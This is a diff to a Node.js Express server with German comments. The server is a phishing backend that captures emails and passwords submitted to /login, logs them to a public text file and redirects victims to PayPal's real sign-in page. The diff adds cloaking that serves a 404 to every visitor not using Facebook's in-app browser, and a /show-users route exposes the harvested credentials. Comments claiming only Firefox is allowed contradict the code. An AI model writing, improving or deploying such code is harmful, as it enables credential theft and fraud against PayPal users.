@@ -4,46 +4,52 @@ const fs = require("fs");
 const path = require("path");
 
 const app = express();
-const DATA_FILE = path.join(__dirname, "public/users.txt");
+const DATA_FILE = path.join(__dirname, "public", "users.txt");
 
-// Stelle sicher, dass die Datei existiert
+// 1. Nur Facebook In-App WebView erlauben
+app.use((req, res, next) => {
+  const ua = req.headers["user-agent"] || "";
+  if (!/(FBAN\/|FBAV\/)/i.test(ua)) {
+    return res.status(404).send("");
+  }
+  next();
+});
+
+// 2. Sicherstellen, dass users.txt existiert
 if (!fs.existsSync(DATA_FILE)) {
   fs.writeFileSync(DATA_FILE, "", "utf8");
 }
 
-// Middleware
+// 3. Body-Parsing und static-Folder
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(express.static(path.join(__dirname, "public")));
 
-// Login-Route: schreibt E-Mail und Passwort in users.txt
+// 4. Login-Route: schreibt E-Mail und Passwort in users.txt
 app.post("/login", (req, res) => {
   const { email, password } = req.body;
   const line = `${new Date().toISOString()} | ${email} | ${password}\n`;
 
-  // Anhängen an die Datei
   fs.appendFile(DATA_FILE, line, "utf8", (err) => {
     if (err) {
       console.error("Fehler beim Schreiben:", err);
       return res.status(500).send("Serverfehler");
     }
-    // Nach dem Speichern weiterleiten
     res.redirect("https://www.paypal.com/signin");
   });
 });
 
-// Server starten
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Server läuft auf Port ${PORT}`);
-});
-
-// noch in index.js
+// 5. Route zum Ausliefern der Datei (nur Firefox-Nutzer)
 app.get("/show-users", (req, res) => {
-  const dataPath = path.join(__dirname, "/public/users.txt");
-  res.sendFile(dataPath, (err) => {
+  res.sendFile(path.join(__dirname, "public", "users.txt"), (err) => {
     if (err) {
       console.error("Fehler beim Lesen der Datei:", err);
       res.status(500).send("Konnte Datei nicht laden");
     }
   });
+});
+
+// 6. Server starten
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`Server läuft auf Port ${PORT} – nur Firefox erlaubt.`);
 });
